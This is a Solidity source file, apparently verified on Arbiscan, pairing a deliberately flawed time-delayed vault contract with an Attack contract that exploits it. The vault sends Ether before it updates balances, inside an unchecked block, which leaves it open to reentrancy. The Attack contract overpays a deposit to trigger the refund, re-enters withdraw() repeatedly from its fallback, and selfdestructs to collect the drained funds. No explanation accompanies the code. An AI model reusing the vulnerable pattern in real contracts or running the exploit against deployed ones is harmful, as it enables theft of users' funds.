/**
 *Submitted for verification at Arbiscan on 2022-07-04
*/

// SPDX-License-Identifier: GPL-3.0
pragma solidity ^0.8;

contract TimeDelayed {
    uint32 constant timePeriod = 60 * 60 * 24 * 30;// one month
    uint256 public lastWithdrawTime;
    mapping(address => uint256) public remainTokens;
    uint256 public constant withdrawEtherNumber = 0.01 ether;
    uint256 public constant depositEtherNumber = 0.01 ether;
    uint32 triedNumber;

    modifier counter() {
        triedNumber++;
        _;
    }

    function withdraw() counter public {
        unchecked {
            require(block.timestamp > (lastWithdrawTime + timePeriod), "Not the right time");
            require(remainTokens[msg.sender] <= address(this).balance,"Contract does not have enough token");
            require(remainTokens[msg.sender] >= withdrawEtherNumber,"You do not have enough token");
            (bool success, ) = msg.sender.call{value: withdrawEtherNumber}("");//
            require(success, "Failed to send Ether");
            remainTokens[msg.sender] -= withdrawEtherNumber;
            lastWithdrawTime = block.timestamp;
        }
    }

    function deposit() payable counter public {
        require(block.timestamp > (lastWithdrawTime + timePeriod), "Not the right time");
        require(msg.value >= depositEtherNumber);
        remainTokens[msg.sender] += depositEtherNumber;
        if (msg.value > depositEtherNumber) {
            (bool success, ) = msg.sender.call{value: (msg.value - depositEtherNumber)}("");
            require(success, "Failed to refund Ether");
        }
        lastWithdrawTime = block.timestamp;
    }

    function depositByOwner() payable public {
    }
}

contract Attack {
    TimeDelayed public timedelayed;

    constructor (address _address) {
        timedelayed = TimeDelayed(_address);
    }

    function kill() public {
        selfdestruct(payable(msg.sender));
    }

    function attack() payable public {
        require(msg.value >= 0.01 ether);
        timedelayed.deposit{value: 0.015 ether}();
    }

    fallback() external payable {
        if (address(timedelayed).balance > 0.01 ether) {
            timedelayed.withdraw();
        }
    }
}